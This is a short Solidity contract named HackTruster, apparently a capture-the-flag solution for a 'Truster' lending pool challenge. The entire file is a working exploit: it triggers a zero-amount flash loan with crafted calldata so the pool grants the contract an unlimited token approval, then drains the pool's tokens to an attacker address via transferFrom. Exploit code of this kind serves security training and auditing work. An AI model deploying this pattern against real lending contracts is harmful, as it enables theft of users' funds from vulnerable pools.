// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITruster {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract HackTruster {
    function attack(
        address _truster,
        uint256 _borrowAmount,
        address _target,
        address _attacker
    ) external {
        ITruster(_truster).flashLoan(
            0,
            address(this),
            _target,
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                type(uint256).max
            )
        );
        IERC20(_target).transferFrom(_truster, _attacker, _borrowAmount);
    }
}
